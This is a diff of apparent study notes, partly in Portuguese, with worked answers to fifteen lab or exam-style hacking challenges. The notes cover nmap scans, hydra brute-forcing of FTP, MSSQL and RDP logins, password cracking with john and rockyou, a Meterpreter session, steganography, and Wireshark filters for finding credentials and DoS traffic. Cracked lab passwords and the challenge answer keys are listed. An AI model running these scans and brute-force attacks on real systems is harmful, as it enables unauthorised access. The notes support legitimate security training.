@@ -1,23 +1,31 @@
+#------------------------------#
+
+
 # PART II - Challenge 1  💬ANSWER: https://www.crushftp.com/💬
-nmap -p 21 192.168.10.0/24 --open
-nmap -sV -p 21 192.168.10.111
-nmap -sV -p 21 192.168.10.222
-nmap -sV -p 21 192.168.10.144
-wget ftp://anonymous@192.168.10.222/home/nick/exploit_info.txt
-ping 192.168.10.111
-ping 192.168.10.222
-ping 192.168.10.144
-sudo find / -type f -iname 'password.txt' 2>/dev/null
-hydra -l nick -P /home/attacker/Desktop/password.txt ftp://192.168.10.111
+nmap -p 21 --open -iL ~/anotacoes/1_2.txt
+nmap -sV -p 21 192.168.10.144 192.168.10.222
+# nmap -sV -A -p 21 192.168.10.144 192.168.10.222
+# nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p 21 192.168.10.144 192.168.10.222
+find ~ -type f -iname 'passwords.txt'
+hydra -l nick -P ~/Desktop/password.txt ftp://192.168.10.111
 ### INFO: [21] [ftp] host: 192.168.10.111 login: nick password: apple
 
-ftp 192.168.10.111 # NOUTRO TERMINAL
+ftp 192.168.10.111 
 ### USERNAME: nick
 ### PASSWORD: apple
 #### ~/Desktop/52012.py
 ls  # CONECTADO VIA FTP
 get 52012.py
-cat 52012.py | grep www
+exit
+grep www 52012.py
+
+## 🗒️ NOTES
+echo -e "https://www.crushftp.com\nUSER: nick\nPASS: apple" > ~/anotacoes/2_1.txt
+cat ~/anotacoes/2_1.txt
+
+
+#------------------------------#
+
 
 # PART II - Challenge 2 💬ANSWER: kety/apple💬
 #### C:\Users\Admin\Downloads\MScredremote.pcapng
@@ -27,31 +35,87 @@ cat 52012.py | grep www
 ####    Form item: "txtusername" == "kety"
 ####    Form item: "txtpwd" == "apple"
 
+# ⚠️ COMANDOS IMPORTANTES
+### FILTER: http.request.method == "POST" && http contains "pwd"
+### FILTER: http contains "username" || http contains "password"
+### PATH: Statistics → Conversations → TCP
+### PATH: Follow → HTTP Stream
+
+## 🗒️ NOTES
+echo -e "Mscredremote.pcapng\nUSER: kety\nPASS: apple" > ~/anotacoes/2_2.txt
+cat ~/anotacoes/2_2.txt
+
+
+#------------------------------#
+
+
 # PART II - Challenge 3  💬ANSWER: Quake Network Protocol💬
 #### ~/Downloads/ServerDoS.pcapng
 wireshark ~/Downloads/ServerDoS.pcapng
-#### INFO: 9850 → 26000 Len=0
+#### INFO: 9850 → 26000 Len=0  # Muitos pacotes vazios chegando em 26000/UDP
 #### User Datagram Protocol, Src Port: 9850, Dst Port: 26000
 #### GOOGLE: 26000 udp protocol 
+
+# ⚠️ COMANDOS IMPORTANTES
+#### FILTER: udp
+#### FILTER: udp.dstport == 26000
+### PATH: Statistics → Endpoints → UDP
+### PATH: Statistics → Conversations → UDP
+### PATH: Statistics → IO Graphs
+### PATH: <BOTÃO DIREITO MOUSE NO PACOTE> → Decode As...
+
+
+#------------------------------#
+
 
 # PART II - Challenge 4  💬ANSWER: 192.168.10.144💬
 #### ~/Documents/DD_attack.pcapng
 wireshark ~/Documents/DD_attack.pcapng
+### PATH: Statistics → Endpoints → UDP
+### INFO: 192.168.10.144 # Envio médio de 1000 pacotes em múltiplas portas altas (de 49900 a 49999) utilizadas. UDP Flood com varredura de portas altas.
+
+# ⚠️ COMANDOS IMPORTANTES
 ### FILTER: udp
-### Statistics → Conversations
-### INFO: Address A → 192.168.10.144
+#### FILTER: udp && ip.src == 192.168.10.144
+#### FILTER: udp && ip.src == 192.168.10.144 && udp.dstport >= 49900 && udp.dstport <= 49999
+### PATH: Statistics → Endpoints → UDP
+### PATH: Statistics → Conversations → UDP
+### PATH: Statistics → IO Graphs
+
+
+#------------------------------#
+
 
 # PART II - Challenge 5  💬ANSWER: 172.30.10.99💬
 #### ~/Downloads/PyD_attack.pcapng
 wireshark ~/Downloads/PyD_attack.pcapng
 ### FILTER: tcp.port == 135
-### Statistics → Conversations
-### INFO: Address A → 172.30.10.99
+### PATH: Statistics → Endpoints → TCP
+#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 0
+#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 1
+#### FILTER: tcp.port == 135 && tcp.flags.reset == 1
+### INFO: 172.30.10.99 # Esse IP é origem na comunição pela porta 135 (inicio de comunicação por RPC) para o destino 192.168.0.222
+
+# ⚠️ COMANDOS IMPORTANTES
+### FILTER: tcp.port == 135
+#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 0
+#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 1
+#### FILTER: tcp.port == 135 && tcp.flags.reset == 1
+### PATH: Statistics → Endpoints → TCP
+### PATH: Statistics → Conversations → TCP
+
+
+#------------------------------#
+
 
 # ⚠️ PART II - Challenge 6  💬ANSWER: 192.168.10.222💬 
 #### C:\Users\Admin\Documents\report export.txt
 Get-Content '.\report export.txt' -TotalCount 20
 ### INFO: Remote IP Address → 192.168.10.222
+
+
+#------------------------------#
+
 
 # PART II - Challenge 7  💬ANSWER: c3ll0@123💬
 find / -type f -name '*.py' 2>/dev/null | grep GetNPU
@@ -65,6 +129,10 @@ find ~ -type f -iname 'rockyou.txt' 2>/dev/null
 john --wordlist=/home/attacker/rockyou.txt a.txt
 ### INFO: c3ll0@123 (?)
 
+
+#------------------------------#
+
+
 # PART II - Challenge 8  💬ANSWER: 7💬
 nmap -p 1433 192.168.10.0/24 --open
 hydra -L ~/Desktop/username.txt -P ~/Desktop/password.txt 192.168.10.144 mssql
@@ -77,14 +145,26 @@ cd /Users/Public/Downloads # NO METERPRETER
 dir 
 ### INFO: Size → 7
 
+
+#------------------------------#
+
+
 # PART II - Challenge 9  💬ANSWER: Pumpkin@1234💬
 nmap -p 3389 192.168.10.0/24 --open
 hydra -l Maurice -P /home/attacker/rockyou.txt 192.168.10.222 rdp
 ### INFO: [3389] [rdp] host: 192.168.10.222 login: Maurice password: Pumpkin@1234
 
+
+#------------------------------#
+
+
 # ⚠️ PART II - Challenge 10  💬ANSWER: d282💬
 #### ~/Donwloads/Tools.rar
 sha256sum Tools.rar
+
+
+#------------------------------#
+
 
 # ⚠️ PART II - Challenge 11 💬ANSWER: 6952💬
 #### ~/Pictures/Logfile.PML
@@ -99,6 +179,10 @@ ifconfig
 ### INFO: 11:36:...   H3ll0.exe   8688   Process Profiling   SUCCESS   User Time: 0.3437...
 ### INFO: Parent PID → 6952
 
+
+#------------------------------#
+
+
 # ⚠️ PART II - Challenge 12 💬ANSWER: 2.87💬
 #### ~/Downloads/Tornado
 cd ~/Downloads
@@ -111,9 +195,17 @@ ifconfig
 ### File → Open file... → C:\Users\Admin\Downloads\Tornado → ELF
 ### INFO: Total → 2.87903
 
+
+#------------------------------#
+
+
 # PART II - Challenge 13 💬ANSWER: 192.168.10.144💬
 nmap -p 2002 192.168.10.0/24
 ### INFO: 2002/tcp open globe
+
+
+#------------------------------#
+
 
 # PART II - Challenge 14 💬ANSWER: 3965222💬
 #### ~/Desktop/stealth.jpeg
@@ -121,6 +213,10 @@ steghide extract -sf ~/Desktop/stealth.jpeg
 ### PASSWORD: azerty@123
 open hidden.txt
 ### INFO: Tender quote for techiquest event 2024: 3965222
+
+
+#------------------------------#
+
 
 # PART II - Challenge 15 💬ANSWER: android/dos/46445.c💬
 searchsploit AirDrop 2.0
